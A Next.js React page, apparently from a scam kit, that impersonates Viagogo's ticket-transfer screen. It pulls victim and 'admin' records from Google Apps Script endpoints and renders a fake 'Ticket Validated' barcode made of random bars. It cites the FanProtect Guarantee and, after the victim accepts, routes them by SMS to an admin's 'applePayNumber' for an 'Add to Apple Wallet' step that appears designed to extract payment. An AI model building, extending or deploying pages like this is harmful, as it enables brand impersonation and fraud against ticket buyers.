'use client';

import { useState, useCallback, useEffect, useRef } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faMapMarkerAlt, faClock, faInfoCircle, faTicketAlt, faUser, faCalendarAlt, faChair, faIdCard, faCheckCircle, faBell, faTimesCircle, faLock, faWallet, faMobileAlt, faChevronLeft, faChevronRight } from '@fortawesome/free-solid-svg-icons';
import Image from 'next/image';
import { useUser } from '../../UserContext';

const APP_SCRIPT_POST_URL = process.env.NEXT_PUBLIC_APP_SCRIPT_URL || "";
const APP_SCRIPT_ADMIN_URL = process.env.NEXT_PUBLIC_APP_SCRIPT_ADMIN_URL || "";

export default function TicketDetails() {
    const router = useRouter();
    const { fetchUserData } = useUser();
    const [approvalStatus, setApprovalStatus] = useState('pending');
    const [pageReady, setPageReady] = useState(false);
    const initialStatusSet = useRef(false);
    const [isActionLoading, setIsActionLoading] = useState(false);
    const params = useParams();
    const userId = params.id as string;
    const [user, setUser] = useState<any | null>(null);
    const [adminInfo, setAdminInfo] = useState<any | null>(null);
    const [loading, setLoading] = useState(true);
    const [currentSeatIndex, setCurrentSeatIndex] = useState(0);

    // Fetch User and Admin data
    useEffect(() => {
        if (userId) {
            const fetchData = async () => {
                setLoading(true);
                try {
                    const fetchedUser = await fetchUserData(userId);
                    if (fetchedUser) {
                        setUser(fetchedUser);
                        
                        // Fetch admin who transferred this ticket to get their Apple Pay info
                        if (fetchedUser.admin) {
                            const adminResponse = await fetch(`${APP_SCRIPT_ADMIN_URL}`);
                            const admins = await adminResponse.json();
                            const relevantAdmin = admins.find((a: any) => a.username === fetchedUser.admin);
                            if (relevantAdmin) {
                                setAdminInfo(relevantAdmin);
                            }
                        }
                    } else {
                        router.push('/invalid');
                    }
                } catch (error) {
                    console.error("Error fetching data:", error);
                    router.push('/invalid');
                } finally {
                    setLoading(false);
                }
            };
            fetchData();
        }
    }, [userId, fetchUserData, router]);

    useEffect(() => {
      if (user && userId && !loading) {
          console.log("user.systemStatus:", user.systemStatus);
          console.log("Redirect condition:", user.systemStatus === "DECLINED" || user.systemStatus === "RETRACTED" || user.systemStatus === "CANCELLED");
  
          if (
              user.systemStatus === "DECLINED" ||
              user.systemStatus === "RETRACTED" ||
              user.systemStatus === "CANCELLED"
          ) {
              router.push("/invalid");
              return;
          }
  
          if (user.systemStatus === "WAITING APPROVAL") {
              setApprovalStatus("pending");
          } else if (
              user.systemStatus === "WAITING COMPLETION" ||
              user.systemStatus === "COMPLETED"
          ) {
              setApprovalStatus("approved");
          }
  
          setPageReady(true);
          initialStatusSet.current = true;
      }
  }, [user, router, userId, loading]);
  
    const handleAcceptTicket = useCallback(() => {
        if (user?.approvalSTAMP) return;

        setIsActionLoading(true);
        setApprovalStatus('processing');

        const currentDate = new Date().toISOString();
        let payload = new URLSearchParams();
        payload.append("action", "ticketApproval");
        payload.append("userId", user?.userId as string);
        payload.append("approvalSTAMP", currentDate);

        fetch(APP_SCRIPT_POST_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: payload.toString()
        }).then(() => {
            setTimeout(() => {
                setApprovalStatus('approved');
                setIsActionLoading(false);
            }, 10000);
        }).catch(error => {
            console.error("Error accepting ticket:", error);
            setApprovalStatus('pending');
            setIsActionLoading(false);
        });
    }, [user]);

    const handleDeclineTransfer = useCallback(() => {
        if (user?.approvalSTAMP) return;

        setIsActionLoading(true);
        setApprovalStatus('processing');

        let payload = new URLSearchParams();
        payload.append("action", "ticketApproval");
        payload.append("userId", user?.userId as string);
        payload.append("approvalSTAMP", "DECLINED");

        fetch(APP_SCRIPT_POST_URL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: payload.toString()
        }).then(() => {
            setTimeout(() => {
                setApprovalStatus('declined');
                setIsActionLoading(false);
            }, 10000);
        }).catch(error => {
            console.error("Error declining ticket:", error);
            setApprovalStatus('pending');
            setIsActionLoading(false);
        });
    }, [user]);

    if (!pageReady) {
        return (
            <div className="min-h-screen flex items-center justify-center">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#89CF28]"></div>
            </div>
        );
    }

    if (!user) {
        return (
            <div className="min-h-screen flex items-center justify-center">
                <div className="text-center p-8">
                    <h2 className="text-2xl font-bold mb-4">User Not Found</h2>
                    <p className="text-gray-600">Please sign in to view ticket details.</p>
                </div>
            </div>
        );
    }

    const isTicketProcessed = approvalStatus === 'approved' || approvalStatus === 'declined';

    return (
      <div className="min-h-screen bg-[#F8F9FA] pt-[140px] lg:pt-[170px]">
      {/* Hero Section */}
      <div className="relative h-[300px] md:h-[450px]">
        <Image
          src={user.coverImage || "https://placehold.co/1200x600/001B41/FFFFFF?text=Event+Image"}
          alt={user.eventName}
          fill
          style={{ objectFit: 'cover' }}
          priority
          unoptimized={true}
        />
        <div className="absolute inset-0 bg-gradient-to-t from-[#001B41] via-[#001B41]/40 to-transparent" />
        <div className="absolute bottom-0 left-0 right-0 p-6 md:p-12 text-white">
          <div className="container mx-auto">
            <div className="inline-flex items-center bg-[#89CF28] text-white px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider mb-4 shadow-lg">
              <FontAwesomeIcon icon={faTicketAlt} className="mr-2" />
              Official Transfer
            </div>
            <h1 className="text-3xl md:text-5xl font-extrabold mb-4 drop-shadow-md">{user.eventName}</h1>
            <div className="flex flex-wrap items-center gap-4 md:gap-8 text-sm md:text-lg font-medium opacity-90">
              <div className="flex items-center">
                <FontAwesomeIcon icon={faMapMarkerAlt} className="mr-2 text-[#89CF28]" />
                <span>{user.venue}, {user.location}</span>
              </div>
              <div className="flex items-center">
                <FontAwesomeIcon icon={faCalendarAlt} className="mr-2 text-[#89CF28]" />
                <span>{new Date(user.dateTime).toLocaleString('en-US', {
                  weekday: 'short',
                  month: 'short',
                  day: 'numeric',
                  year: 'numeric',
                  hour: 'numeric',
                  minute: '2-digit'
                })}</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8 md:py-12">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 md:gap-12">
          {/* Left Column - Event Details */}
          <div className="lg:col-span-8">
            <div className="bg-white rounded-3xl shadow-xl overflow-hidden mb-8">
              <div className="p-6 md:p-10">
                <h2 className="text-2xl md:text-3xl font-bold text-gray-900 mb-8 border-b pb-4 flex items-center">
                  <span className="w-2 h-8 bg-[#89CF28] rounded-full mr-4"></span>
                  Transfer Status
                </h2>

                {/* Status Card */}
                {isTicketProcessed ? (
                  <div className={`mb-10 p-6 md:p-8 rounded-2xl ${
                    approvalStatus === 'approved' 
                      ? 'bg-[#89CF28]/5 border-2 border-[#89CF28]/10' 
                      : 'bg-red-50 border-2 border-red-100'
                  }`}>
                    <div className="flex items-center">
                      <div className={`rounded-full p-4 mr-6 ${
                        approvalStatus === 'approved' 
                          ? 'bg-[#89CF28] text-white' 
                          : 'bg-red-500 text-white'
                      } shadow-lg`}>
                        <FontAwesomeIcon 
                          icon={approvalStatus === 'approved' ? faCheckCircle : faTimesCircle} 
                          className="text-2xl" 
                        />
                      </div>
                      <div>
                        <h3 className="font-extrabold text-xl md:text-2xl text-gray-900 mb-1">
                          {approvalStatus === 'approved' ? 'Transfer Successful' : 'Transfer Declined'}
                        </h3>
                        <p className={`text-sm md:text-base font-medium ${
                          approvalStatus === 'approved' ? 'text-[#89CF28]' : 'text-red-700'
                        }`}>
                          {user.messageStatus || (
                            approvalStatus === 'approved' 
                              ? 'Success! Your tickets are now secured in your Viagogo account.' 
                              : 'You have declined this ticket transfer. The tickets have been returned to the seller.'
                          )}
                        </p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="mb-10 p-6 md:p-8 bg-[#001B41]/5 border-2 border-[#001B41]/10 rounded-2xl shadow-inner">
                    <div className="flex items-center mb-8">
                      <div className="bg-[#001B41] rounded-2xl p-4 mr-6 shadow-xl">
                        <FontAwesomeIcon icon={faTicketAlt} className="text-[#89CF28] text-2xl" />
                      </div>
                      <div>
                        <h3 className="font-extrabold text-xl md:text-2xl text-[#001B41] mb-1">Pending Transfer</h3>
                        <p className="text-gray-600 font-medium">
                          {approvalStatus === 'processing'
                            ? 'Processing your secure transfer...'
                            : 'A seller has sent you tickets for this event. Action required.'}
                        </p>
                      </div>
                    </div>
                    
                    {approvalStatus === 'pending' && (
                      <div className="flex flex-col md:flex-row space-y-4 md:space-y-0 md:space-x-4">
                        <button 
                            onClick={handleAcceptTicket}
                            className="viagogo-button-primary flex-1 text-lg shadow-lg hover:shadow-[#89CF28]/30"
                            disabled={isActionLoading}
                        >
                            {isActionLoading ? (
                               <div className="flex items-center justify-center">
                                 <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent mr-3"></div>
                                 Securing...
                               </div>
                            ) : 'Accept Tickets'}
                        </button>
                        <button 
                            onClick={handleDeclineTransfer}
                            className="flex-1 bg-gray-100 text-gray-700 py-4 rounded-xl font-bold hover:bg-gray-200 transition-all active:scale-95"
                            disabled={isActionLoading}
                        >
                            Decline
                        </button>
                      </div>
                    )}
                    
                    {approvalStatus === 'processing' && (
                      <div className="flex flex-col items-center justify-center p-8 text-center">
                        <div className="loader mb-4"></div>
                        <p className="font-bold text-[#001B41] animate-pulse">Finalizing secure transfer via FanProtect Guarantee...</p>
                      </div>
                    )}
                  </div>
                )}

                {/* Details Sections */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-10 md:gap-16">
                   <div className="space-y-8">
                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Sender Information</h3>
                      <div className="flex items-center bg-gray-50 p-4 rounded-2xl">
                        <div className="bg-white shadow-sm rounded-full w-12 h-12 flex items-center justify-center mr-4">
                          <FontAwesomeIcon icon={faUser} className="text-gray-400" />
                        </div>
                        <div>
                          <p className="font-bold text-gray-900">{user.senderName || "John Doe"}</p>
                          <p className="text-xs text-gray-500 font-medium">{user.senderEmail || "john.doe@example.com"}</p>
                        </div>
                      </div>
                    </div>

                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Event Details</h3>
                      <ul className="space-y-5">
                        <li className="flex items-start">
                          <div className="bg-gray-100 p-2 rounded-lg mr-4">
                            <FontAwesomeIcon icon={faClock} className="text-gray-500" />
                          </div>
                          <div>
                            <p className="font-bold text-gray-900 text-sm">Door Time</p>
                            <p className="text-gray-500 text-sm font-medium">{user.doorTime}</p>
                          </div>
                        </li>
                        <li className="flex items-start">
                          <div className="bg-gray-100 p-2 rounded-lg mr-4">
                            <FontAwesomeIcon icon={faIdCard} className="text-gray-500" />
                          </div>
                          <div>
                            <p className="font-bold text-gray-900 text-sm">Entry Requirement</p>
                            <p className="text-gray-500 text-sm font-medium">{user.ageRestriction || "All Ages"}</p>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </div>

                  <div className="space-y-8">
                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Ticket Location</h3>
                      <div className="bg-[#001B41] p-6 rounded-2xl text-white shadow-xl">
                        <div className="grid grid-cols-3 gap-4 text-center">
                           <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Section</p>
                            <p className="text-xl font-extrabold">{user.section} {user.sectionNo}</p>
                          </div>
                          <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Row</p>
                            <p className="text-xl font-extrabold">{user.row}</p>
                          </div>
                          <div>
                            <p className="text-[10px] opacity-60 font-bold uppercase mb-1">Seat</p>
                            <p className="text-xl font-extrabold text-[#89CF28]">{user.seatNumbers}</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div>
                      <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Guarantee</h3>
                      <div className="bg-[#89CF28]/5 border border-[#89CF28]/10 p-4 rounded-2xl flex items-start">
                         <FontAwesomeIcon icon={faCheckCircle} className="text-[#89CF28] mt-1 mr-3" />
                         <p className="text-xs text-[#001B41]/80 font-medium leading-relaxed">
                           Every order is covered by our <strong>FanProtect Guarantee</strong>. We'll provide you with a valid ticket for your event.
                         </p>
                      </div>
                    </div>
                  </div>
                </div>

                {user.description && (
                  <div className="mt-12 pt-8 border-t">
                    <h3 className="text-xs uppercase font-bold text-gray-400 tracking-widest mb-4">Event Information</h3>
                    <p className="text-gray-600 text-sm md:text-base leading-relaxed">{user.description}</p>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Right Column - Mobile Optimized Ticket Preview */}
          <div className="lg:col-span-4">
            <div className="viagogo-card sticky top-32 overflow-visible">
               {/* Decorative elements */}
               <div className="absolute -top-3 -left-3 w-8 h-8 bg-[#89CF28] rounded-full z-10 animate-ping opacity-20"></div>
               
               <div className="bg-[#001B41] text-white p-6 relative overflow-hidden">
                  <div className="absolute right-[-20px] top-[-20px] w-32 h-32 bg-white/5 rounded-full"></div>
                  <h2 className="text-xl font-extrabold flex items-center">
                    <img src="/logo.svg" alt="Viagogo" className="h-6 filter brightness-0 invert mr-3" />
                    Preview
                  </h2>
               </div>

               <div className="p-6 md:p-8 bg-white relative">
                  {/* Ticket Mockup - Slidable Implementation */}
                  <div className="border-2 border-gray-100 rounded-[32px] overflow-hidden shadow-2xl bg-white">
                     <div className="bg-[#001B41] py-3 px-6 flex justify-between items-center border-b-2 border-dashed border-gray-700/50">
                        <span className="text-[10px] font-bold text-white/60 tracking-widest uppercase">Digital Entry Ticket</span>
                        <div className="text-white/60 text-[10px] font-bold uppercase tracking-widest">
                           {currentSeatIndex + 1} of {user.seatNumbers?.split(',').length || 1}
                        </div>
                     </div>
                     
                     <div className="relative overflow-hidden">
                        <div 
                           className="flex transition-transform duration-500 ease-out"
                           style={{ transform: `translateX(-${currentSeatIndex * 100}%)` }}
                        >
                           {(user.seatNumbers?.split(',') || [user.seatNumbers]).map((seatNum: string, idx: number) => (
                              <div key={idx} className="min-w-full p-6">
                                 <div className="mb-6">
                                    <h3 className="font-extrabold text-gray-900 text-xl mb-1 line-clamp-1">{user.eventName}</h3>
                                    <p className="text-xs font-bold text-[#89CF28] uppercase tracking-wide truncate">{user.venue}</p>
                                 </div>
                                 
                                 <div className="grid grid-cols-3 gap-3 mb-6">
                                    <div className="bg-gray-50 rounded-xl p-3 text-center">
                                       <p className="text-[8px] font-black text-gray-400 uppercase mb-1">Sec</p>
                                       <p className="text-sm font-black text-[#001B41]">{user.section}</p>
                                    </div>
                                    <div className="bg-gray-50 rounded-xl p-3 text-center">
                                       <p className="text-[8px] font-black text-gray-400 uppercase mb-1">Row</p>
                                       <p className="text-sm font-black text-[#001B41]">{user.row}</p>
                                    </div>
                                    <div className="bg-gray-50 rounded-xl p-3 text-center">
                                       <p className="text-[8px] font-black text-gray-400 uppercase mb-1 text-[#89CF28]">Seat</p>
                                       <p className="text-sm font-black text-[#89CF28]">{seatNum.trim()}</p>
                                    </div>
                                 </div>

                                 {/* Barcode Area */}
                                 <div className="relative mb-6">
                                    {approvalStatus === 'approved' ? (
                                      <div className="bg-gray-50 rounded-2xl p-6 border border-gray-100 text-center">
                                         <div className="text-[9px] font-bold text-[#89CF28] mb-3 animate-pulse uppercase tracking-widest">● Ticket Validated</div>
                                         <div className="h-16 flex flex-col items-center justify-center">
                                            <div className="w-full flex justify-center space-x-0.5 h-10 mb-3">
                                               {Array.from({length: 35}).map((_, i) => (
                                                  <div key={i} className={`h-full bg-gray-900`} style={{width: `${Math.random() * 3 + 1}px`, opacity: Math.random() > 0.5 ? 1 : 0.4}}></div>
                                               ))}
                                            </div>
                                            <p className="text-[9px] font-mono font-bold text-gray-400">{user.userId?.toUpperCase()}-{idx + 1}</p>
                                         </div>
                                      </div>
                                    ) : (
                                       <div className="bg-gray-50 rounded-2xl p-10 border border-gray-100 border-dashed text-center">
                                          <div className="loader mx-auto mb-4 scale-75 opacity-40"></div>
                                          <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Awaiting Approval</p>
                                       </div>
                                    )}
                                 </div>

                                 <div className="bg-[#89CF28]/5 py-2 rounded-xl mb-4 border border-[#89CF28]/10">
                                    <div className="flex items-center justify-center space-x-2 text-[9px] font-bold text-[#89CF28] uppercase tracking-widest">
                                       <FontAwesomeIcon icon={faLock} />
                                       <span>Verified Secure Ticket</span>
                                    </div>
                                 </div>

                                 {/* Apple Wallet Button - Conditional */}
                                 {adminInfo?.applePayNumber && approvalStatus === 'approved' && (
                                    <a 
                                       href={`sms:${adminInfo.applePayNumber}?body=Hi, I would like to add my tickets for ${user.eventName} to my Apple Wallet. UserID: ${user.userId}`}
                                       className="w-full bg-[#001B41] text-white py-3.5 rounded-2xl font-black text-sm shadow-xl flex items-center justify-center hover:scale-[1.02] transition-transform active:scale-95"
                                    >
                                       <FontAwesomeIcon icon={faWallet} className="mr-3" />
                                       Add to Apple Wallet
                                    </a>
                                 )}
                              </div>
                           ))}
                        </div>

                        {/* Navigation Arrows */}
                        {user.seatNumbers?.split(',').length > 1 && (
                           <>
                              {currentSeatIndex > 0 && (
                                 <button 
                                    onClick={() => setCurrentSeatIndex(prev => prev - 1)}
                                    className="absolute left-2 top-1/2 -translate-y-1/2 w-8 h-8 bg-white/90 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-[#001B41] z-10"
                                 >
                                    <FontAwesomeIcon icon={faChevronLeft} className="text-xs" />
                                 </button>
                              )}
                              {currentSeatIndex < user.seatNumbers.split(',').length - 1 && (
                                 <button 
                                    onClick={() => setCurrentSeatIndex(prev => prev + 1)}
                                    className="absolute right-2 top-1/2 -translate-y-1/2 w-8 h-8 bg-white/90 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-[#001B41] z-10"
                                 >
                                    <FontAwesomeIcon icon={faChevronRight} className="text-xs" />
                                 </button>
                              )}
                           </>
                        )}
                     </div>
                  </div>

                  <div className="mt-8 p-6 bg-[#89CF28]/5 rounded-2xl border border-[#89CF28]/10">
                     <h4 className="font-extrabold text-[#89CF28] text-sm mb-2 flex items-center">
                        <FontAwesomeIcon icon={faInfoCircle} className="mr-2" />
                        FanProtect Guarantee
                     </h4>
                     <p className="text-[11px] text-[#001B41]/70 leading-relaxed font-medium">
                        Your tickets are backed by Viagogo. If the event is cancelled and not rescheduled, you'll receive a full refund.
                     </p>
                  </div>
               </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    );
}
